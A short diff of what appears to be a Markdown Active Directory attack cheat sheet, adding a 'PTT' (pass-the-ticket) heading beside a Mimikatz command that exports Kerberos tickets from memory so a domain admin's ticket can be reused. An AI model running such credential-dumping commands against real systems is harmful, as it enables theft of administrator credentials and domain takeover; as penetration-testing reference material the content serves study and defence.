@@ -644,6 +644,7 @@ We must trick or wait for a domain admin to connect to a service on the compromi
 
 ```Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'```
 
+#### PTT
 We can then reuse the DA token:
 
 ```
